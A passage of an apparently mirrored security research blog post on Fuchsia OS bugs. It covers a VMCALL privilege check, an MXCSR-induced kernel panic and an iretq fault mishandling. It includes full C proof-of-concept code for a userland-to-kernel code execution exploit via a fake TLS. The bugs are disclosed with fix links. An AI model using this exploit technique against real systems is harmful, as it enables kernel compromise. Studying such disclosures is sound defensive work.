+<p>Fix: <a href="https://fuchsia.googlesource.com/fuchsia/+/11ac53d31b0914f48a5ec3d03a651e53d9c07f02">[hypervisor][x86] Check CPL when handling a VMCALL</a>.</p>
+</div>
+<div id="kernel-mishandling-of-mxcsr">
+<h3>Kernel mishandling of <tt>MXCSR</tt></h3>
+<p>The <tt>zx_thread_write_state()</tt> syscall allows to set the registers
+of a suspended thread. This syscall is accessible with just a handle on the
+thread, and thread creation is allowed by default to any userland program, so
+we can invoke this syscall.</p>
+<p>Among others, this syscall allows to modify the registers encoding the FPU
+state, and in particular the <tt>MXCSR</tt> register on x86. This is basically a
+32-bit register that has reserved bits that should remain set to zero. The
+problem is, Zircon doesn't disallow modifications to these reserved bits.</p>
+<p>By using <tt>zx_thread_write_state()</tt> we can set <tt>MXCSR</tt> to <tt>0xFFFFFFFF</tt>, and
+when the suspended thread resumes a fatal <tt>#GP</tt> exception is raised, resulting
+in a kernel panic:</p>
+<p><img alt="" src="https://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/panic.png"></p><p>Of course, this is only an unexploitable panic, but we're making progress: at
+least we managed to hit the kernel.</p>
+<p>Fix: <a href="https://fuchsia.googlesource.com/fuchsia/+/7eb8c8fb29fd8b6620c66f502bbed182f1b6c5c4">[zircon][debugger] Don't write reserved part of mxcsr register</a>.</p>
+</div>
+<div id="kernel-mishandling-of-iretq">
+<h3>Kernel mishandling of <tt>iretq</tt></h3>
+<p>On x86, in order to return from an interrupt or an exception, the <tt>iretq</tt>
+instruction is used. This instruction will fault (<tt>#GP</tt>) if attempting to
+return to a <em>non-canonical address</em>, that is to say, if the return address is
+in the range <tt>0x0000800000000000</tt>-<tt>0xFFFF7FFFFFFFFFFF</tt>.</p>
+<p>This fault is special: it is received with the userland <em>thread-local storage</em>
+(TLS) already loaded in the <tt>gs.base</tt> register, but with the CPL (<em>Current Privilege Level</em>)
+of the kernel. The <tt>gs.base</tt> register is basically a 64-bit register that holds
+a pointer to the TLS.</p>
+<p>The <tt>#GP</tt> handler must be careful to switch back to the kernel TLS before
+continuing.</p>
+<p>Two bugs were noticed on Fuchsia:</p>
+<ol>
+<li>Zircon does not verify that the return addresses are canonical when returning
+from an interrupt or exception handler.</li>
+<li>Zircon does not handle correctly the <tt>iretq</tt>-generated faults, and doesn't
+restore the kernel TLS in the <tt>#GP</tt> handler.</li>
+</ol>
+<p>The combination of the two means that it is possible to make <tt>iretq</tt> fault in
+the kernel, and to have the fault handler execute with the userland TLS!</p>
+<div id="the-tls-on-zircon">
+<h4>The TLS on Zircon</h4>
+<p>The kernel TLS on Zircon is a <tt>x86_percpu</tt> structure, which contains useful
+fields for code execution, such as <tt>gpf_return_target</tt> (as we will see below).</p>
+</div>
+<div id="exploitation">
+<h4>Exploitation</h4>
+<p>The steps of the exploitation are the following:</p>
+<ol>
+<li>Create a thread. The thread must not do anything (infinite loop for example).</li>
+<li>Suspend this thread with the <tt>zx_task_suspend()</tt> syscall.</li>
+<li>Use <tt>zx_thread_write_state()</tt> to change the <tt>%rip</tt> register of the
+suspended thread, and put a non-canonical value in it, such as
+<tt>0x00FFFFFFFFFFFFFF</tt>. Also change the value of <tt>gs.base</tt> to a specific
+value that we will call <tt>FakeTlsAddr</tt>.</li>
+<li>Use the <tt>zx_handle_close()</tt> syscall to resume the suspended thread.</li>
+<li>When the thread resumes, the kernel will return to it; it will execute
+<tt>swapgs</tt> (to install the userland <tt>gs.base</tt> value), and then <tt>iretq</tt>,
+which will fault because the <tt>%rip</tt> value we set is non-canonical. The
+kernel ends up in the <tt>#GP</tt> fault handler.</li>
+<li>The <tt>#GP</tt> handler sees that the fault was received in the kernel, and does
+not execute <tt>swapgs</tt> because it thinks that since we came from the kernel
+then we must have the kernel TLS loaded. The handler therefore wrongfully
+stays with the userland <tt>gs.base</tt> value. It then calls the
+<tt>x86_exception_handler()</tt> function.</li>
+<li><tt>x86_exception_handler()</tt> uses this TLS. In particular, it will quickly
+exit if the <tt>gpf_return_target</tt> field of the TLS is non-zero, and it will
+actually jump into this address!</li>
+<li>The CPU jumps into <tt>gpf_return_target</tt> with kernel privileges.</li>
+</ol>
+<p>In the end, the kernel uses the structure located at <tt>FakeTlsAddr</tt> thinking
+it is a trusted <tt>x86_percpu</tt> structure from the kernel whereas it is actually
+a structure possibly controlled by userland. By placing a specific value in the
+<tt>gpf_return_target</tt> field of this fake structure, userland can begin to gain
+code execution in kernel mode.</p>
+<p>Userland must choose the <tt>FakeTlsAddr</tt> address so that it points to a kernel
+buffer where userland data got copied, or to a buffer in userland directly (if
+there is no <tt>SMEP</tt>/<tt>SMAP</tt>).</p>
+<p>As a toy example, we developed a simple exploit that relies on <tt>SMEP</tt>/<tt>SMAP</tt>
+not being present:</p>
+<div><pre><span></span><span>#include</span> <span>&lt;stdio.h&gt;</span><span></span>
+<span>#include</span> <span>&lt;stdlib.h&gt;</span><span></span>
+<span>#include</span> <span>&lt;stdint.h&gt;</span><span></span>
+<span>#include</span> <span>&lt;pthread.h&gt;</span><span></span>
+<span>#include</span> <span>&lt;zircon/syscalls.h&gt;</span><span></span>
+<span>#include</span> <span>&lt;zircon/threads.h&gt;</span><span></span>
+<span>#include</span> <span>&lt;zircon/process.h&gt;</span><span></span>
+<span>#include</span> <span>&lt;zircon/syscalls/debug.h&gt;</span><span></span>
+
+<span>#define __aligned(x)    __attribute__((__aligned__(x)))</span>
+<span>#define __barrier()     __asm __volatile("":::"memory")</span>
+<span>#define PAGE_SIZE       4096</span>
+
+<span>volatile</span> <span>zx_handle_t</span> <span>MyThreadHandle</span><span>;</span>
+<span>volatile</span> <span>int</span> <span>Ready</span><span>;</span>
+<span>volatile</span> <span>int</span> <span>Resume</span><span>;</span>
+
+<span>uint8_t</span> <span>FakeThread</span><span>[</span><span>PAGE_SIZE</span><span>]</span> <span>__aligned</span><span>(</span><span>PAGE_SIZE</span><span>);</span>
+<span>uint8_t</span> <span>FakeUStack</span><span>[</span><span>PAGE_SIZE</span><span>]</span> <span>__aligned</span><span>(</span><span>PAGE_SIZE</span><span>);</span>
+
+<span>/*</span>
+<span> * Short, simplified version of "struct x86_percpu". We are mainly interested</span>
+<span> * in "gpf_return_target" here, because it dictates where the #GP handler</span>
+<span> * returns. We make it point to a userland address.</span>
+<span> */</span>
+<span>union</span> <span>{</span>
+        <span>struct</span> <span>FakeCpu</span> <span>{</span>
+                <span>void</span> <span>*</span><span>direct</span><span>;</span>
+                <span>void</span> <span>*</span><span>current_thread</span><span>;</span>
+                <span>uintptr_t</span> <span>stack_guard</span><span>;</span>
+                <span>uintptr_t</span> <span>kernel_unsafe_sp</span><span>;</span>
+                <span>uintptr_t</span> <span>saved_user_sp</span><span>;</span>
+                <span>uint32_t</span> <span>blocking_disallowed</span><span>;</span>
+                <span>volatile</span> <span>uint8_t</span> <span>*</span><span>monitor</span><span>;</span>
+                <span>void</span> <span>*</span><span>idle_states</span><span>;</span>
+                <span>uint32_t</span> <span>apic_id</span><span>;</span>
+                <span>uintptr_t</span> <span>gpf_return_target</span><span>;</span>
+        <span>}</span> <span>FakeCpu</span><span>;</span>
+        <span>uint8_t</span> <span>raw</span><span>[</span><span>2</span><span>*</span><span>PAGE_SIZE</span><span>];</span>
+<span>}</span> <span>FakeTls</span> <span>__aligned</span><span>(</span><span>PAGE_SIZE</span><span>);</span>
+
+<span>/* -------------------------------------------------------------------------- */</span>
+
+<span>/*</span>
+<span> * This function runs as ring0, with the context of MyThread(). Put whatever</span>
+<span> * you want in it, this basically executes as kernel code.</span>
+<span> */</span>
+<span>static</span> <span>void</span> <span>RunAsRing0</span><span>(</span><span>void</span><span>)</span>
+<span>{</span>
+        <span>__asm</span> <span>volatile</span> <span>(</span>
+                <span>/* ... */</span>
+                <span>"1: jmp 1b</span><span>
+</span><span>"</span>
+        <span>);</span>
+<span>}</span>
+
+<span>/*</span>
+<span> * Expose the handle of the thread. Kinda annoying to do, I didn't find a way</span>
+<span> * to retrieve that handle from the parent thread directly (the thing is hidden</span>
+<span> * inside pthread etc).</span>
+<span> */</span>
+<span>static</span> <span>void</span> <span>*</span><span>MyThread</span><span>(</span><span>void</span> <span>*</span><span>arg</span><span>)</span>
+<span>{</span>
+        <span>printf</span><span>(</span><span>"[Thread] Started</span><span>
+</span><span>"</span><span>);</span>
+        <span>MyThreadHandle</span> <span>=</span> <span>zx_thread_self</span><span>();</span>
+        <span>__barrier</span><span>();</span>
+        <span>Ready</span> <span>=</span> <span>1</span><span>;</span>
+        <span>__barrier</span><span>();</span>
+        <span>while</span> <span>(</span><span>!</span><span>Resume</span><span>);</span>
+        <span>printf</span><span>(</span><span>"[Thread] Resumed</span><span>
+</span><span>"</span><span>);</span>
+        <span>return</span> <span>NULL</span><span>;</span>
+<span>}</span>
+
+<span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span><span>**</span> <span>argv</span><span>)</span>
+<span>{</span>
+        <span>zx_thread_state_general_regs_t</span> <span>regs</span><span>;</span>
+        <span>zx_handle_t</span> <span>token</span><span>;</span>
+        <span>zx_status_t</span> <span>res</span><span>;</span>
+        <span>pthread_t</span> <span>thid</span><span>;</span>
+
+        <span>pthread_create</span><span>(</span><span>&amp;</span><span>thid</span><span>,</span> <span>NULL</span><span>,</span> <span>MyThread</span><span>,</span> <span>NULL</span><span>);</span>
+
+        <span>/*</span>
+<span>         * Wait for the handle to be exposed...</span>
+<span>         */</span>
+        <span>while</span> <span>(</span><span>!</span><span>Ready</span><span>);</span>
+
+        <span>printf</span><span>(</span><span>"[Main] Ready</span><span>
+</span><span>"</span><span>);</span>
+
+        <span>res</span> <span>=</span> <span>zx_task_suspend</span><span>(</span><span>MyThreadHandle</span><span>,</span> <span>&amp;</span><span>token</span><span>);</span>
+        <span>if</span> <span>(</span><span>res</span> <span>!=</span> <span>ZX_OK</span><span>)</span> <span>{</span>
+                <span>printf</span><span>(</span><span>"[Main] zx_task_suspend failed: %d</span><span>
+</span><span>"</span><span>,</span> <span>res</span><span>);</span>
+                <span>return</span> <span>0</span><span>;</span>
+        <span>}</span>
+        <span>printf</span><span>(</span><span>"[Main] Suspended</span><span>
+</span><span>"</span><span>);</span>
+
+        <span>FakeTls</span><span>.</span><span>FakeCpu</span><span>.</span><span>direct</span> <span>=</span> <span>&amp;</span><span>FakeTls</span><span>;</span>
+        <span>FakeTls</span><span>.</span><span>FakeCpu</span><span>.</span><span>current_thread</span> <span>=</span> <span>FakeThread</span><span>;</span>
+        <span>FakeTls</span><span>.</span><span>FakeCpu</span><span>.</span><span>gpf_return_target</span> <span>=</span> <span>(</span><span>uintptr_t</span><span>)</span><span>&amp;</span><span>RunAsRing0</span><span>;</span>
+        <span>FakeTls</span><span>.</span><span>FakeCpu</span><span>.</span><span>kernel_unsafe_sp</span> <span>=</span> <span>(</span><span>uintptr_t</span><span>)</span><span>&amp;</span><span>FakeUStack</span><span>[</span><span>PAGE_SIZE</span><span>];</span>
+
+        <span>res</span> <span>=</span> <span>zx_thread_read_state</span><span>(</span><span>MyThreadHandle</span><span>,</span>
+            <span>ZX_THREAD_STATE_GENERAL_REGS</span><span>,</span> <span>&amp;</span><span>regs</span><span>,</span> <span>sizeof</span><span>(</span><span>regs</span><span>));</span>
+        <span>if</span> <span>(</span><span>res</span> <span>!=</span> <span>ZX_OK</span><span>)</span> <span>{</span>
+                <span>printf</span><span>(</span><span>"[Main] zx_thread_read_state failed: %d</span><span>
+</span><span>"</span><span>,</span> <span>res</span><span>);</span>
+                <span>return</span> <span>0</span><span>;</span>
+        <span>}</span>
+
+        <span>regs</span><span>.</span><span>gs_base</span> <span>=</span> <span>(</span><span>uintptr_t</span><span>)</span><span>&amp;</span><span>FakeTls</span><span>;</span> <span>/* Our fake TLS */</span>
+        <span>regs</span><span>.</span><span>rip</span> <span>=</span> <span>0x00FFFFFFFFFFFFFF</span><span>;</span> <span>/* A non-canonical address */</span>
+
+        <span>res</span> <span>=</span> <span>zx_thread_write_state</span><span>(</span><span>MyThreadHandle</span><span>,</span>
+            <span>ZX_THREAD_STATE_GENERAL_REGS</span><span>,</span> <span>&amp;</span><span>regs</span><span>,</span> <span>sizeof</span><span>(</span><span>regs</span><span>));</span>
+        <span>if</span> <span>(</span><span>res</span> <span>!=</span> <span>ZX_OK</span><span>)</span> <span>{</span>
+                <span>printf</span><span>(</span><span>"[Main] zx_thread_write_state failed: %d</span><span>
+</span><span>"</span><span>,</span> <span>res</span><span>);</span>
+                <span>return</span> <span>0</span><span>;</span>
+        <span>}</span>
+
+        <span>Resume</span> <span>=</span> <span>1</span><span>;</span>
+        <span>zx_handle_close</span><span>(</span><span>token</span><span>);</span> <span>/* The thread resumes */</span>
+
+        <span>pthread_join</span><span>(</span><span>thid</span><span>,</span> <span>NULL</span><span>);</span>
+        <span>printf</span><span>(</span><span>"[Main] Survived! Exploit failed?!</span><span>
+</span><span>"</span><span>);</span>
+        <span>return</span> <span>0</span><span>;</span>
+<span>}</span>
+</pre></div>
+<p>With it, we are able to gain kernel code execution from a regular userland
+process.</p>
+<p>Fix: <a href="https://fuchsia.googlesource.com/fuchsia/+/0054a8a1162c2ea857fb02553835b804ead7b124">[zircon][debugger] Disallow setting non-canonical rip addresses</a>.</p>
+</div>
+</div>
+<div id="others">
+<h3>Others</h3>
+<p>Some other uninteresting bugs were found, such as:</p>
+<ul>
+<li>Divisions by zero in USB drivers, which would only kill the USB user process with no effect on the kernel and components;</li>
+<li>kernel stack info leaks caused by lack of initialization on structures copied to userland, which are actually mitigated by <a href="https://reviews.llvm.org/D54604">AutoVarInit</a>, a compiler feature that initializes buffers automatically;</li>
+<li>out-of-bounds accesses in the Bluetooth stack, which are mitigated by sanity checks within <tt>C++</tt> methods and operators; and</li>
+<li>bluetooth DoSes where an attacker could use up the component's memory, but again without affecting the kernel.</li>
+</ul>
+</div>
+</div>
+<div id="conclusion">
+<h2>Conclusion</h2>
+<p>Overall, Fuchsia exhibits interesting security properties compared to other
+OSes such as Android.</p>
+<p>A few days of vulnerability research allowed us to conclude that the common
+programming bugs found in other OSes can also be found in Fuchsia. However,
+while these bugs can often be considered as vulnerabilities in other OSes, they
+turn out to be uninteresting on Fuchsia, because their impact is, for the
+most part, mitigated by Fuchsia's security properties.</p>
+<p>We note however that these security properties do not - and in fact, cannot -
+hold in the lowest layers of the kernel related to virtualization, exception
+handling and scheduling, and that any bug here remains exploitable just like
+on any other OS.</p>
+<p>All the bugs we found were reported to Google, and are now fixed.</p>
+<p>Again, it is not clear where Fuchsia is heading, and whether it is just a
+research OS as Google claims or a real OS that is vowed to be used on future
+products. What's clear, though, is that it has the potential to significantly
+increase the difficulty for attackers to compromise devices.</p>
+</div>
+
+</div><!-- /.entry-content -->
+
+                </article>
+                </section>
+        </div><!--/span-->
+
+      </div></div></div>
+    </div>
+    <footer>
+        <div>created by buildstarted &copy; 2020 <a href="/about">about</a></div>
+        <div>Share this page on social media: copy and paste this url https://linksfor.dev/</div>
+        <div>If you prefer RSS: <a href="https://linksfor.dev/feed.xml">https://linksfor.dev/feed.xml</a></div>
+        <div>Customer satisfaction guaranteed to be optional.</div>
+    </footer>
+    
+    <script async defer>
+        _dna = window._dna || {};
+        _dna.siteId = "linksfor.devs";
+        _dna.outlink = true;
+
+        (function() {
+            let dna = document.createElement('script');
+            dna.type = 'text/javascript';
+            dna.async = true;
+            dna.src = '//dna.buildstarted.com/t.js';
+            let s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(dna, s);
+        })();
+    </script>
+    <noscript><img src="//dna.buildstarted.com/g?siteId=linksfor.devs"/></noscript>
+</body>
+</html>
